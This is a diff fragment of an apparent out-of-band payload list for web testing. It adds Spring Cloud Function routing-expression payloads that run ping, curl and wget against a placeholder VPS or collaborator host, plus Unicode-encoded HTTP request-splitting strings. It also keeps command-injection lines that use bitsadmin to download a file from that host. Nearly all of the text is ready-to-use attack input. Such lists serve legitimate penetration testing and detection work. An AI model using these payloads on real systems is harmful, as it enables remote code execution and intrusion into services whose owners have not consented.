@@ -1,3 +1,11 @@
+spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("ping vps_ip")
+spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl vps_ip:80/curl_s4s")
+spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("wget vps_ip:80/wget_s4s")
+x\u0120HTTP/1.1\u010d\u010aHost:127.0.0.1\u010d\u010a\u010d\u010aGET\u0120/\u0120HTTP/1.1\u010d\u010aHost:vps_ip:80\u010d\u010a\u010d\u010aGET\u0120
+spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("ping domain_collab")
+spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl domain_collab/curl_s4s")
+spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("wget domain_collab/wget_s4s")
+x\u0120HTTP/1.1\u010d\u010aHost:127.0.0.1\u010d\u010a\u010d\u010aGET\u0120/\u0120HTTP/1.1\u010d\u010aHost:domain_collab\u010d\u010a\u010d\u010aGET\u0120
 $(bitsadmin /transfer oob_test /priority high https://domain_collab/bitsadmin.txt %temp%\bitsadmin.txt)
 $(`bitsadmin /transfer oob_test /priority high https://domain_collab/bitsadmin.txt %temp%\bitsadmin.txt`)
 $(bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt)
